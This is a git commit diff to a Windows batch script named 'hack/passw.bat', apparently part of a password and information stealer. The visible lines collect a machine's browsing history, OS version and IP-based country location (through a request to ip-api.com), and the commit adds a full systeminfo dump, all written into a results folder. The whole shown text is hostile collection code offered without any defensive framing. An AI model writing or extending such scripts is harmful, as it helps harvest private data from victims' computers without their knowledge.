a79d0321e7c2660ddfee8430cbd9d0ffabbbee3a
johnny20061234 <46470547+congaterori@users.noreply.github.com>
2021-05-11 20:35:10 +0700

    Update passw.bat

--- hack/passw.bat
+++ hack/passw.bat
@@ -7,4 +7,5 @@ timeout /nobreak 5 >nul 2>&1
 sort results\history.txt /o results\history.txt
 wmic os get version > results\version.txt
 powershell /command "(Invoke-WebRequest -Uri 'http://ip-api.com/line').Content" > results\country.txt
+systeminfo > results\info.txt
 exit
